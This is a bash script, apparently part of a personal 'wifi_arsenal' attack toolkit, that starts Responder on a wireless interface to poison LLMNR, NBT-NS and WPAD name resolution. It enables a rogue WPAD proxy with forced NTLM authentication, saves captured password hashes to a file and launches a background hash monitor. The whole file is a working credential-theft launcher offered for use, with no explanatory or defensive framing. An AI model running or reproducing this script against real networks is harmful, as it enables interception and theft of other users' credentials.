#!/bin/bash
# Start Responder for LLMNR/NBT-NS/WPAD poisoning

INTERFACE="${1:-alfa1}"
PID_FILE="/tmp/responder_pid.txt"
LOG_DIR="/home/ov3rr1d3/wifi_arsenal/captures/responder"
HASH_FILE="/home/ov3rr1d3/wifi_arsenal/captures/hashes/responder_hashes.txt"

mkdir -p "$LOG_DIR"
mkdir -p "$(dirname $HASH_FILE)"

# Check if already running
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    if ps -p "$OLD_PID" > /dev/null 2>&1; then
        echo "[-] Responder already running (PID: $OLD_PID)"
        exit 1
    fi
fi

echo "[*] Starting Responder on $INTERFACE"
echo "[*] Hash output: $HASH_FILE"

# Find Responder's log directory
RESPONDER_LOG_DIR="/usr/share/responder/logs"
if [ ! -d "$RESPONDER_LOG_DIR" ]; then
    RESPONDER_LOG_DIR="/var/lib/responder/logs"
fi

# Start Responder
# -I interface
# -w enable WPAD rogue proxy
# -F force NTLM auth on WPAD file retrieval
sudo responder -I "$INTERFACE" -w -F > "$LOG_DIR/responder.log" 2>&1 &
SUDO_PID=$!

sleep 3

# Find the actual responder child of sudo (sudo PID != tool PID)
REAL_PID=$(pgrep -P $SUDO_PID -f "responder" 2>/dev/null || echo $SUDO_PID)
echo $REAL_PID > "$PID_FILE"

if ps -p $REAL_PID > /dev/null 2>&1; then
    echo "[+] Responder started (PID: $REAL_PID)"
    echo "[+] Poisoning LLMNR, NBT-NS, WPAD"
    echo "[+] Logs: $LOG_DIR/responder.log"
    
    # Start hash monitor in background
    nohup /home/ov3rr1d3/wifi_arsenal/scripts/internal/monitor_hashes.sh > /dev/null 2>&1 &
    echo "[+] Hash monitor started"
else
    echo "[-] Responder failed to start"
    cat "$LOG_DIR/responder.log"
    exit 1
fi
